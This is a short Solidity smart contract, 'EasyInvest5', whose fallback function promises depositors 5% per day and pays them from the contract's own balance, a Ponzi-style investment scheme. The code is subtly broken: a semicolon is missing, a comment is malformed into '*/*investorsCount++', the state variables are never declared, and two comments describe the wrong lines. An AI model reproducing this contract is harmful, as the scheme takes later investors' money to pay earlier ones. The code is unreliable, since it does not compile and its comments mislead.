contract EasyInvest5 {
function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0 && block.number > atBlock[msg.sender]) {
            // calculate profit amount as such:
            // amount = (amount invested) * 5% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;
            // if requested amount more than contract balance - we will send a rest
            if (amount > this.balance) amount = this.balance;

            // send calculated amount of ether directly to sender (aka YOU)
            msg.sender.transfer(amount);
        } else {
            investors.push(msg.sender);
        }

        /* record block number of this transaction */
        invested[msg.sender] += msg.value;
        /* record invested amount (msg.value) of this transaction */
        atBlock[msg.sender] = block.number
        /*increase total investors count*/*investorsCount++;
    }
}